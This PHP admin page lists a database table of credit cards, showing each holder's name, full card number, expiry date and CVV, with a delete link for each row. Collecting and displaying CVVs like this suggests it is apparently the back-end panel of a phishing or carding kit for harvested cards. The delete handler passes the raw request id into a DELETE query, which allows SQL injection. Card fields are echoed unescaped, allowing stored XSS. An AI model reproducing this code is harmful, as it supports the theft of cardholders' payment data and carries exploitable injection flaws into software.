<?php
include 'header.php';
?>

<?php
require('../../db/index.php');
if(isset($_REQUEST['id']))
{
$id=$_REQUEST['id'];
$query = "DELETE FROM cards WHERE id=$id"; 
$result = mysqli_query($con,$query) or die ( mysqli_error());
header("Location: cards.php"); 
}
?>
        <!-- ============================================================== -->
        <!-- Page Content -->
        <!-- ============================================================== -->
        <div id="page-wrapper">
            <div class="container-fluid">

                <!-- ============================================================== -->
                <!-- table -->
                <!-- ============================================================== -->
                <div class="row">
                    <div class="col-md-12 col-lg-12 col-sm-12">
                        <div class="white-box">
<h3 class="box-title">Credit Cards</h3>
<div class="table-responsive">
                                <table class="table">
                                    <thead>
                                        <tr>
    <th>#</th>
    <th>Holder</th>
    <th>Number</th>
    <th>Expiry MM/YY</th>
    <th>CVV</th>
    <th>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
<?php
require('../../db/index.php');
$count=1;
$sel_query="Select * from cards ORDER BY id desc;";
$result = mysqli_query($con,$sel_query);
while($row = mysqli_fetch_assoc($result)) { ?>
  <tr>
    <td><?php echo $count; ?></td>    
    <td><?php echo $row["name"]; ?></td>
    <td><?php echo $row["number"]; ?></td>
    <td><?php echo $row["expiry"]; ?></td>
    <td><?php echo $row["cvc"]; ?></td>
    <td><a href="?id=<?php echo $row["id"]; ?>">Delete</a></td>
  </tr>
<?php $count++; } ?>
                                    </tbody>
                                </table>
                            </div>
							
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- chat-listing & recent comments -->
                <!-- ============================================================== -->
            </div>
			
<?php
include 'footer.php';
?>